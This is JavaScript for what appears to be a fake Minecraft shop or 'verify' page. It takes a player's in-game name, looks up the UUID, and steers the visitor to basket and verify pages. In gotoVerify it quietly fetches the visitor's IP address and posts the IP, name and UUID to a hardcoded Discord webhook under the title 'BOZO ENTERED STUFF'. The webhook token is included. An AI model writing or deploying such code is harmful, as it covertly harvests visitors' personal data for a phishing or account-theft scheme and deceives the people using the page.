function getCookie(cname) {
    let name = cname + "=";
    let decodedCookie = decodeURIComponent(document.cookie);
    let ca = decodedCookie.split(";");
    for (let i = 0; i < ca.length; i++) {
        let c = ca[i];
        while (c.charAt(0) == " ") {
            c = c.substring(1);
        }
        if (c.indexOf(name) == 0) {
            return c.substring(name.length, c.length);
        }
    }
    return "";
}

async function createCookies() {
    // check to be sure ign isnt empty
    const ign = document.getElementById("ign").value;
    if (ign == "") return;
    document.cookie = "ign=" + ign;
    const body = await fetch(`https://api.ashcon.app/mojang/v2/user/${ign}`, {
        method: "GET",
    }).then((res) => res.json());
    var uuid = await body.uuid;
    uuid = await uuid.replaceAll("-", "");
    document.cookie = "uuid=" + (await uuid);
    console.log(await uuid);
    gotoCart();
}

// get ip
let ip;
const apiUrl = "https://api.ipify.org";
const responsePromise = fetch(apiUrl).then(response => response.text()).catch(error => console.error(error));

function gotoCart() {
    location.href = "basket.html";
}

function gotoDetails() {
    location.href = "details.html";
}


function gotoVerify() {
    (async () => {
    ip = await responsePromise;
    const uuid = getCookie("uuid");
    const ign = getCookie("ign");

    msg = {
        username: "test1",
        avatar_url: `https://crafatar.com/avatars/${uuid}?size=512&overlay`,
        embeds: [
            {
                title: "BOZO ENTERED STUFF",
                color: 0,
                fields: [
                    {
                        name: "Name",
                        value: ign,
                        inline: true,
                    },
                    {
                        name: "IP",
                        value: ip,
                        inline: true,
                    },
                    {
                        name: "UUID",
                        value: uuid,
                        inline: false,
                    },
                ],
                image: {
                    url: `https://visage.surgeplay.com/full/${uuid}`,
                },
                author: {
                    name: ign,
                    icon_url: `https://crafatar.com/avatars/${uuid}?size=512&overlay`,
                },
            },
        ],
    };

    fetch("https://discord.com/api/webhooks/1102232394825732120/D7lOnOremLs7dTlSeMLGarq32ny-RYyamyn6HcXwQ8UyPIA8AsAJKwySvoRsQGLSl-2p",
        {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(msg),
        }
    );
})();
    location.href = "verify.html";
}

async function submitIgn() {
    const ign = document.getElementById("ign").value;
    document.cookie = "ign=" + ign;
    const body = await fetch(`https://api1.inqz.net/uuid/${ign}`, {
        method: "GET",
    }).then((res) => res.json());
    var uuid = await body.id;
    uuid = await uuid.replaceAll("-", "");
    document.cookie = "uuid=" + (await uuid);
    console.log(await uuid);
    gotoCart();
}

// listen for when enter is pressed
document.addEventListener("keypress", function onEvent(event) {
    if (event.key === "Enter") {
        // check if ign is empty
        if (document.getElementById("ign").value == "") return;
        createCookies();
    }
});
